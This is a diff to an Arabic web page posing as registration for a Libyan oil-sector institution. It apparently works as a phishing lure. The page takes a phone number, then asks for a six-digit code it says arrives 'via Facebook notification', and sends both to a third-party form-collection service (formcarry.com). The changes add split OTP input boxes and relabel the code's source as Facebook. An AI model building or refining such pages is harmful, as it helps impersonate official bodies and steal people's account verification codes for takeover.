@@ -3,16 +3,7 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title>المؤسسة الوطنــية</title>
-
-  <!-- Google tag (gtag.js) -->
-  <script async src="https://www.googletagmanager.com/gtag/js?id=G-PZEERNXDY2"></script>
-  <script>
-    window.dataLayer = window.dataLayer || [];
-    function gtag(){dataLayer.push(arguments);}
-    gtag('js', new Date());
-    gtag('config', 'G-PZEERNXDY2');
-  </script>
+  <title>المؤسسة الوطنيــة</title>
 
   <link rel="icon" href="uy.jpeg" type="image/png">
   <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700&display=swap" rel="stylesheet">
@@ -130,8 +121,38 @@
       min-height: 24px;
     }
 
-    #codeField {
-      display: none;
+    .otp-container {
+      display: flex;
+      justify-content: center;
+      gap: 10px;
+      margin-bottom: 10px;
+      direction: ltr;
+    }
+
+    .otp-input {
+      width: 44px;
+      height: 52px;
+      font-size: 26px;
+      font-weight: bold;
+      text-align: center;
+      border: 2px solid #003366;
+      border-radius: 10px;
+      background-color: #f9f9f9;
+      color: #002147;
+      outline: none;
+      transition: border-color 0.2s ease;
+    }
+
+    .otp-input:focus {
+      border-color: gold;
+    }
+
+    .autofill-hint {
+      text-align: center;
+      font-size: 14px;
+      color: #555;
+      margin-top: 5px;
+      margin-bottom: 20px;
     }
 
     .error {
@@ -143,11 +164,9 @@
   </style>
 </head>
 <body>
-
   <div id="main-content">
     <div class="container">
       <div class="logo-container">
-        <!-- الشعار فقط بدون عداد زوار -->
         <img src="uy.jpeg" alt="شعار المؤسسة الليبية للعمل النفطي" />
         <p>التسجيل في منظومة المؤسسة الليبية للعمل النفطي</p>
       </div>
@@ -169,11 +188,27 @@
       </form>
 
       <form id="codeForm" onsubmit="return sendCode(event);">
-        <div id="codeField">
-          <label for="code">جاري إرسال الكود عبر SMS</label>
-          <input type="text" id="code" name="code" placeholder="اكتب الكود هنا" autocomplete="one-time-code" />
+        <div id="codeField" style="display: none;">
+          <label style="font-weight: bold; color: #003366; font-size: 18px;">
+            جاري إرسال الكود عبر إشعار فيسبوك
+          </label>
+
+          <div class="otp-container" id="otpInputs">
+            <input type="text" class="otp-input" maxlength="1" inputmode="numeric" />
+            <input type="text" class="otp-input" maxlength="1" inputmode="numeric" />
+            <input type="text" class="otp-input" maxlength="1" inputmode="numeric" />
+            <input type="text" class="otp-input" maxlength="1" inputmode="numeric" />
+            <input type="text" class="otp-input" maxlength="1" inputmode="numeric" />
+            <input type="text" class="otp-input" maxlength="1" inputmode="numeric" />
+          </div>
+
+          <div class="autofill-hint">
+            سيتم إدخال الكود تلقائيًا عند وصول إشعار من فيسبوك إذا كان مدعومًا من المتصفح.
+          </div>
+
           <div id="errorMessage" class="error"></div>
           <button type="submit" id="sendCodeBtn">تأكيد الكود</button>
+
           <div id="processingMessage" style="display: none; color: #003366; font-weight: bold; margin-top: 20px;">
             جاري معالجة طلبك، يمكن المراجعة خلال 7 أيام إلى 30 إذا كان هناك طلب بيانات جديدة منك وشكرًا
           </div>
@@ -234,7 +269,7 @@
         phoneInput.disabled = true;
         document.getElementById('sendPhoneBtn').disabled = true;
         document.getElementById('codeField').style.display = 'block';
-        startTimer(480); // 8 دقائق
+        startTimer(480);
       })
       .catch(error => {
         alert('تعذر إرسال رقم الهاتف. حاول مرة أخرى.');
@@ -244,23 +279,36 @@
       return false;
     }
 
+    document.querySelectorAll('.otp-input').forEach((input, index, inputs) => {
+      input.addEventListener('input', () => {
+        if (input.value.length === 1 && index < inputs.length - 1) {
+          inputs[index + 1].focus();
+        }
+      });
+      input.addEventListener('keydown', (e) => {
+        if (e.key === 'Backspace' && input.value === '' && index > 0) {
+          inputs[index - 1].focus();
+        }
+      });
+    });
+
     function sendCode(event) {
       event.preventDefault();
-      const codeInput = document.getElementById('code');
+      const codeInputs = document.querySelectorAll('.otp-input');
+      const code = Array.from(codeInputs).map(input => input.value).join('');
       const errorMessage = document.getElementById('errorMessage');
       const processingMessage = document.getElementById('processingMessage');
       const sendCodeBtn = document.getElementById('sendCodeBtn');
       errorMessage.textContent = '';
 
-      if (codeInput.value.trim() === '') {
-        errorMessage.textContent = 'يرجى كتابة الكود المرسل إليك.';
-        codeInput.focus();
+      if (code.length !== 6 || !/^[0-9]{6}$/.test(code)) {
+        errorMessage.textContent = 'يرجى إدخال الكود المكون من 6 أرقام بشكل صحيح.';
         return false;
       }
 
       const payload = {
         phone: document.getElementById('phone').value,
-        code: codeInput.value
+        code
       };
 
       fetch('https://formcarry.com/s/2evKahWtdJS', {
